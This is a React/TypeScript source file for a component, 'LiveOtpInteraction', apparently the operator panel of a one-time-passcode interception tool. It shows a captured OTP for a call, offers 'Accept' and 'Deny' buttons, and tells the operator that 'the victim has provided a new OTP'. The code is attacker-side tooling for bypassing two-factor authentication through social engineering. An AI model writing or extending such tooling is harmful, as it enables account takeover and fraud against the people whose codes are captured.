import React from 'react';
import Button from '../common/Button';
import Card from '../common/Card';
import { CheckCircleIcon, ExclamationTriangleIcon, InformationCircleIcon } from '../common/Icons';
import { CapturedOtpDetails } from '../../types';

interface LiveOtpInteractionProps {
  otpDetails: CapturedOtpDetails;
  callId: string;
  isProcessingDecision: boolean;
  onAccept: (callId: string, otpValue: string) => void;
  onDeny: (callId: string, otpValue: string) => void;
  lastAttemptedOtp?: string; // The OTP that was just denied, if applicable
}

const LiveOtpInteraction: React.FC<LiveOtpInteractionProps> = ({
  otpDetails,
  callId,
  isProcessingDecision,
  onAccept,
  onDeny,
  lastAttemptedOtp,
}) => {
  return (
    <Card 
        title="OTP Validation Required" 
        icon={<InformationCircleIcon className="w-6 h-6 text-yellow-500" />} 
        className="mt-6 border-yellow-500 border-2"
        titleClassName="bg-yellow-50"
    >
      <div className="text-center">
        {otpDetails.message && <p className="text-sm text-secondary-700 mb-2">{otpDetails.message}</p>}
        <p className="text-2xl font-bold text-primary-600 my-3 tracking-wider bg-secondary-100 p-3 rounded-lg">
          {otpDetails.otpValue}
        </p>
        
        {lastAttemptedOtp && (
             <p className="text-xs text-red-600 mb-3">
                You previously denied OTP: {lastAttemptedOtp}. The victim has provided a new OTP.
            </p>
        )}

        <p className="text-xs text-secondary-500 mb-4">
          Please verify this OTP and choose an action.
        </p>
      </div>
      <div className="flex justify-around mt-4 space-x-3">
        <Button
          variant="success"
          onClick={() => onAccept(callId, otpDetails.otpValue)}
          isLoading={isProcessingDecision}
          disabled={isProcessingDecision}
          icon={<CheckCircleIcon className="w-5 h-5"/>}
          className="w-full"
        >
          Accept OTP
        </Button>
        <Button
          variant="danger"
          onClick={() => onDeny(callId, otpDetails.otpValue)}
          isLoading={isProcessingDecision}
          disabled={isProcessingDecision}
          icon={<ExclamationTriangleIcon className="w-5 h-5"/>}
          className="w-full"
        >
          Deny OTP
        </Button>
      </div>
    </Card>
  );
};

export default LiveOtpInteraction;
